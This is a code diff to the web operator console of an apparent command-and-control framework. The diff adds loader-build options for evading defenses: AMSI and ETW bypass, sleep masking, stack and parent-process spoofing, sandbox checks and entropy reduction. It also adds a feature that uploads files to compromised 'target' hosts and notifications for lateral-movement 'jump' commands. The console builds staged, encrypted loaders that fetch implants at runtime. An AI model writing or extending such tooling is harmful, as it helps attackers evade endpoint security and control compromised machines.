@@ -579,7 +579,7 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
 <!-- Tab bar (horizontal) -->
 <div id="tabbar">
   <button class="nav-btn active" onclick="showTab('agents')" data-tab="agents">
-    Agents<span class="badge" id="badge-agents" style="display:none">0</span>
+    Agents<span class="badge" id="badge-agents" style="display:none">0</span><span class="badge" id="badge-agents-dead" style="display:none;background:var(--red);margin-left:2px;font-size:9px">0</span>
   </button>
   <button class="nav-btn" onclick="showTab('listeners')" data-tab="listeners">Listeners</button>
   <button class="nav-btn" onclick="showTab('payloads')" data-tab="payloads">Payloads</button>
@@ -616,6 +616,7 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
       <div class="toolbar">
         <button class="btn btn-ghost btn-sm" onclick="resetAllViewPositions();refreshAgents()">↻ Refresh</button>
         <input class="search-box" id="agent-filter" placeholder="Filter agents…" oninput="renderAgents()">
+        <button class="btn btn-ghost btn-sm" style="color:var(--red)" onclick="purgeDeadAgents()" title="Delete all dead agents from DB">🗑 Purge dead</button>
         <div class="spacer"></div>
         <span id="agent-count" style="color:var(--text3);font-size:11px"></span>
         <div id="graph-edge-ctrl" style="display:none;align-items:center;gap:4px">
@@ -1060,7 +1061,7 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
               <div style="font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:.5px;color:var(--text3);margin-bottom:8px">③ Loader type</div>
               <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px">
                 <button class="seg-btn seg-on" id="lf-go"   onclick="setLoaderFmt('loader')">Go (~9MB)</button>
-                <button class="seg-btn"        id="lf-c"    onclick="setLoaderFmt('loader-c')">C (~50KB)</button>
+                <button class="seg-btn"        id="lf-c"    onclick="setLoaderFmt('loader-c')">C (~18KB)</button>
                 <button class="seg-btn"        id="lf-nim"  onclick="setLoaderFmt('loader-nim')">Nim (~300KB)</button>
                 <button class="seg-btn"        id="lf-srdi" onclick="setLoaderFmt('srdi')" title="DLL → sRDI shellcode → C loader">sRDI</button>
               </div>
@@ -1382,7 +1383,7 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
               <div style="font-size:10px;color:var(--text3);background:var(--bg4);border-radius:4px;padding:7px 10px;line-height:1.6">
                 The server handles everything automatically:<br>
                 <span style="color:var(--text2)">build implant → donut → zlib+XOR → staged en C2 → loader EXE con clave + URL integradas</span><br>
-                Distribute <strong style="color:var(--text1)">only the loader (~50KB–9MB)</strong>. The implant downloads at runtime.
+                Distribute <strong style="color:var(--text1)">only the loader (~18KB–9MB)</strong>. The implant downloads at runtime.
               </div>
 
               <!-- ① IMPLANT TO STAGE -->
@@ -1432,6 +1433,52 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
                   </div>
                 </div>
 
+                <!-- OPSEC options -->
+                <details id="ldr-opsec-details" style="font-size:11px">
+                  <summary style="cursor:pointer;color:var(--text2);font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:.4px">⚙ OPSEC</summary>
+                  <div style="display:flex;flex-direction:column;gap:7px;margin-top:8px">
+                    <div class="form-row-inline" style="grid-template-columns:1fr 1fr;margin:0">
+                      <div class="form-row" style="margin:0">
+                        <label>Sleep mask</label>
+                        <select id="ldr-sleepmask" onchange="ldrSleepmaskChange(this)">
+                          <option value="">Desactivado</option>
+                          <option value="xor">XOR</option>
+                          <option value="noaccess">PAGE_NOACCESS ⚠</option>
+                          <option value="ekko" selected>Ekko</option>
+                          <option value="foliage">FOLIAGE</option>
+                        </select>
+                        <div id="ldr-noaccess-warn" style="display:none;font-size:10px;color:var(--yellow);margin-top:3px">⚠ Race condition with SMB child agents</div>
+                      </div>
+                      <div class="form-row" style="margin:0">
+                        <label>AMSI bypass</label>
+                        <select id="ldr-amsi">
+                          <option value="">Desactivado</option>
+                          <option value="veh" selected>Patchless VEH</option>
+                          <option value="patch">Byte patch</option>
+                        </select>
+                      </div>
+                    </div>
+                    <div style="display:flex;gap:14px;flex-wrap:wrap">
+                      <label style="display:flex;align-items:center;gap:5px;cursor:pointer;font-size:12px;text-transform:none;color:var(--text)">
+                        <input type="checkbox" id="ldr-etw" checked> <span>ETW bypass</span>
+                      </label>
+                      <label style="display:flex;align-items:center;gap:5px;cursor:pointer;font-size:12px;text-transform:none;color:var(--text)">
+                        <input type="checkbox" id="ldr-stack" checked> <span>Stack spoof</span>
+                      </label>
+                      <label style="display:flex;align-items:center;gap:5px;cursor:pointer;font-size:12px;text-transform:none;color:var(--text)">
+                        <input type="checkbox" id="ldr-sandbox" checked> <span>Sandbox checks</span>
+                      </label>
+                      <label style="display:flex;align-items:center;gap:5px;cursor:pointer;font-size:12px;text-transform:none;color:var(--text)">
+                        <input type="checkbox" id="ldr-entropy"> <span>Entropy reduce</span>
+                      </label>
+                    </div>
+                    <div class="form-row" style="margin:0">
+                      <label>PPID spoof <span style="font-weight:400;color:var(--text3)">(parent process)</span></label>
+                      <input id="ldr-ppid" placeholder="explorer.exe" style="font-size:11px">
+                    </div>
+                  </div>
+                </details>
+
                 <!-- Dynamic preview -->
                 <div id="ldr-implant-preview" style="font-size:11px;color:var(--green);background:var(--bg4);border-radius:4px;padding:5px 8px;font-family:monospace">
                   agent_http_go.exe → beacons to 10.0.0.1:8080
@@ -1447,7 +1494,7 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
                   <label>Type</label>
                   <select id="ldr-type" onchange="ldrUpdatePreview()">
                     <option value="loader">Go — fileless, CreateThread / APC (~9MB)</option>
-                    <option value="loader-c">C — WinHTTP nativo (~50KB)</option>
+                    <option value="loader-c">C — WinHTTP nativo (~18KB)</option>
                     <option value="loader-nim">Nim (~300KB)</option>
                   </select>
                 </div>
@@ -4190,6 +4237,10 @@ async function runCtxAction(act) {
       }
       break;
     }
+    case 'ctxUploadFile': {
+      ctxUploadFile(act.id || activeAgent?.id);
+      break;
+    }
     case 'consoleCmd': {
       const aid = act.id || activeAgent?.id;
       if (!aid) { toast('No agent selected','error'); return; }
@@ -4311,6 +4362,7 @@ async function runCtxAction(act) {
           cmdLine = `jump ${method} ${vals.host} ${payloadName} ${vals.user} ${vals.pass}`;
         }
         setTimeout(() => dispatchConsoleCmd(aid, cmdLine), 350);
+        toast(`${labels[method]||method} → ${vals.host}: queued — watch Agents tab`, 'yellow', 6000);
       });
       break;
     }
@@ -5237,6 +5289,8 @@ function agentContextMenu(e, agentId) {
     ]},
     {label:'🪙  Rev2Self',          action:{fn:'selectAndTask', id, type:'REV2SELF',  args:''}},
     {label:'🧹  Cleanup',           action:{fn:'selectAndTask', id, type:'CLEANUP',   args:''}},
+    null,
+    {label:'📁 Upload file…',       action:{fn:'ctxUploadFile', id}},
     null,
     {label:'☠  Kill Agent',         action:{fn:'killAgentOnly', id},                           danger:true},
     {label:'🗑  Delete Record',     action:{fn:'deleteAgent',   id},                             danger:true},
@@ -7827,7 +7881,8 @@ function renderAgents() {
     (!filter || [a.hostname,a.username,a.os,a.id].some(f => f?.toLowerCase().includes(filter)))
   );
   const liveCount = filtered.filter(a => agentStatus(a).color !== 'gray').length;
-  document.getElementById('agent-count').textContent = `${liveCount} agent${liveCount!==1?'s':''}${liveCount<filtered.length?' (+'+( filtered.length-liveCount)+' dead)':''}`;
+  const deadCount = filtered.length - liveCount;
+  document.getElementById('agent-count').textContent = `${liveCount} agent${liveCount!==1?'s':''}${deadCount>0?' (+'+deadCount+' dead)':''}`;
   const _ab = document.getElementById('badge-agents');
   if (_ab) {
     _ab.textContent = String(liveCount);
@@ -7836,6 +7891,11 @@ function renderAgents() {
       _ab.classList.add('badge-agents-new');
     }
     _prevLiveCount = liveCount;
+  }
+  const _abd = document.getElementById('badge-agents-dead');
+  if (_abd) {
+    _abd.textContent = String(deadCount);
+    _abd.style.display = deadCount > 0 ? '' : 'none';
   }
 
   // Preserve note input focus/value across re-renders
@@ -12517,6 +12577,22 @@ function removeSelectedAgents() {
   });
 }
 
+function purgeDeadAgents() {
+  const deadIds = agents.filter(a => agentStatus(a).color === 'gray').map(a => a.id);
+  if (!deadIds.length) { toast('No hay agentes muertos', 'yellow'); return; }
+  showConfirm('Purge dead agents', `¿Eliminar ${deadIds.length} agente(s) muerto(s) de la base de datos?`, async () => {
+    let removed = 0;
+    for (const id of deadIds) {
+      const r = await api('DELETE', `/api/agents/${id}/delete`);
+      if (r?.ok) removed++;
+    }
+    agents = agents.filter(a => !deadIds.includes(a.id));
+    selectedAgentIds.clear();
+    renderAgents();
+    toast(`${removed} agente(s) muerto(s) eliminado(s)`);
+  });
+}
+
 async function saveAgentNote(id, note) {
   const a = agents.find(x => x.id === id);
   if (!a || a.notes === note) return;
@@ -13039,13 +13115,18 @@ function ldrSetTransport(tr) {
   ldrUpdatePreview();
 }
 
+function ldrSleepmaskChange(sel) {
+  const warn = document.getElementById('ldr-noaccess-warn');
+  if (warn) warn.style.display = sel.value === 'noaccess' ? '' : 'none';
+}
+
 function ldrUpdatePreview() {
   const urlRaw = (document.getElementById('ldr-url')?.value || '').trim();
   let host = urlRaw.replace(/^https?:\/\//, '').split('/')[0] || '10.0.0.1:8080';
   const names = {go:'Go', nim:'Nim', rust:'Rust', c:'C'};
   const trs   = {http:'HTTP', https:'HTTPS', mtls:'mTLS', tcp:'TCP'};
   const fmt   = document.getElementById('ldr-type')?.value || 'loader';
-  const wrappers = {'loader':'Go loader (~9MB)', 'loader-c':'C loader (~50KB)', 'loader-nim':'Nim loader (~300KB)'};
+  const wrappers = {'loader':'Go loader (~9MB)', 'loader-c':'C loader (~18KB)', 'loader-nim':'Nim loader (~300KB)'};
   const preview = document.getElementById('ldr-implant-preview');
   if (preview) {
     preview.innerHTML =
@@ -13091,17 +13172,32 @@ async function buildLoader() {
   const maxdl     = parseInt(document.getElementById('ldr-maxdl')?.value) || 0;
   const proc      = (document.getElementById('ldr-proc')?.value || '').trim();
 
+  const sleepMask     = document.getElementById('ldr-sleepmask')?.value  || '';
+  const amsiMethod    = document.getElementById('ldr-amsi')?.value       || '';
+  const etwBypass     = document.getElementById('ldr-etw')?.checked      ?? false;
+  const stackSpoof    = document.getElementById('ldr-stack')?.checked    ?? false;
+  const sandboxChk    = document.getElementById('ldr-sandbox')?.checked  ?? false;
+  const entropyReduce = document.getElementById('ldr-entropy')?.checked  ?? false;
+  const ppidSpoof     = (document.getElementById('ldr-ppid')?.value || '').trim();
+
   const body = {
-    format:        loaderFmt,
-    stage_url:     stageURL,
-    server_url:    stageURL,
-    lang:          lang,
-    transport:     transport,
-    sleep_sec:     sleep,
-    jitter_pct:    jitter,
-    garble:        garble,
-    arch:          arch,
-    stage_max_dl:  maxdl,
+    format:           loaderFmt,
+    stage_url:        stageURL,
+    server_url:       stageURL,
+    lang:             lang,
+    transport:        transport,
+    sleep_sec:        sleep,
+    jitter_pct:       jitter,
+    garble:           garble,
+    arch:             arch,
+    stage_max_dl:     maxdl,
+    sleep_mask_mode:  sleepMask,
+    amsi_method:      amsiMethod,
+    etw_bypass:       etwBypass,
+    stack_spoof:      stackSpoof,
+    sandbox_checks:   sandboxChk,
+    entropy_reduce:   entropyReduce,
+    ...(ppidSpoof ? { ppid_spoof: ppidSpoof } : {}),
     ...(proc ? { sacrificial_proc: proc } : {}),
   };
 
@@ -13112,17 +13208,17 @@ async function buildLoader() {
     const d = r.data || {};
     const loaderFile = (d.loader || '').split('/').pop();
     const rawKB      = d.raw_kb || '?';
-    const compKB     = d.compressed_kb || '?';
+    const compKB     = d.compressed_kb || rawKB;
     const stageEndpt = d.bin_stage || '';
-    const token      = stageEndpt.split('/stage/')[1] || '';
-    const dlURL      = loaderFile ? `/api/artifacts/${encodeURIComponent(loaderFile)}?token=${token || ''}` : '';
+    const dlURL      = loaderFile ? `${BASE}/api/artifacts/${encodeURIComponent(loaderFile)}?token=${encodeURIComponent(TOKEN)}` : '';
+    const sizeLabel  = d.compressed_kb ? `${esc(rawKB)} KB raw → <b>${esc(compKB)} KB</b> comprimido+XOR` : `${esc(rawKB)} KB (XOR encrypted)`;
     res.innerHTML = `
       <div class="result-card" style="border-color:var(--green)">
         <div style="color:var(--green);font-weight:700;margin-bottom:8px">✓ Loader listo</div>
         <div style="font-size:11px;display:flex;flex-direction:column;gap:4px">
           <div><span style="color:var(--text3)">Loader:</span> <code>${esc(loaderFile)}</code></div>
           <div><span style="color:var(--text3)">Implant stageado:</span> agent_${esc(transport)}_${esc(lang)}.exe</div>
-          <div><span style="color:var(--text3)">Tamaño:</span> ${esc(rawKB)} KB raw → <b>${esc(compKB)} KB</b> comprimido (XOR)</div>
+          <div><span style="color:var(--text3)">Tamaño:</span> ${sizeLabel}</div>
           <div style="word-break:break-all"><span style="color:var(--text3)">Stage URL:</span> <code style="font-size:10px">${esc(stageEndpt)}</code></div>
           ${maxdl > 0 ? `<div style="color:var(--yellow)">⚠ Stage expira tras ${maxdl} descarga${maxdl>1?'s':''}</div>` : ''}
         </div>
@@ -15971,6 +16067,44 @@ async function fxHandleFileUpload(input) {
     toast('Uploaded: ' + file.name);
     setTimeout(() => fxList(fxCurrentPath), 400);
   } catch(e) { fxSetStatus('Error: ' + e.message); }
+}
+
+// Upload a local file to a specific agent via context menu
+async function ctxUploadFile(agentId) {
+  if (!agentId) { toast('No agent selected', 'red'); return; }
+  const inp = document.createElement('input');
+  inp.type = 'file';
+  inp.onchange = async () => {
+    const file = inp.files[0];
+    if (!file) return;
+    const defDest = `C:\\Windows\\Temp\\${file.name}`;
+    const ag = agents.find(a => a.id === agentId);
+    const isWin = isWindowsAgent(ag);
+    const prompted = window.prompt('Destination path on target:', isWin ? defDest : `/tmp/${file.name}`);
+    if (!prompted) return;
+    const form = new FormData();
+    form.append('file', file);
+    try {
+      toast(`Uploading ${file.name} to server…`, 'yellow', 3000);
+      const resp = await fetch(`${BASE}/api/uploads`, {
+        method: 'POST',
+        headers: {'Authorization': 'Bearer ' + TOKEN},
+        body: form,
+      });
+      const j = await resp.json();
+      if (!j.ok) { toast('Upload to server failed: ' + (j.error||''), 'red'); return; }
+      const r = await api('POST', `/api/agents/${agentId}/task`, {
+        type: 'UPLOAD',
+        args: JSON.stringify({filename: file.name, remote_path: prompted}),
+      });
+      if (r?.ok) {
+        toast(`Upload queued: ${file.name} → ${prompted}`, 'green');
+      } else {
+        toast('UPLOAD task failed', 'red');
+      }
+    } catch(e) { toast('Error: ' + e.message, 'red'); }
+  };
+  inp.click();
 }
 
 // Pick a server payload and push it to current directory on the agent
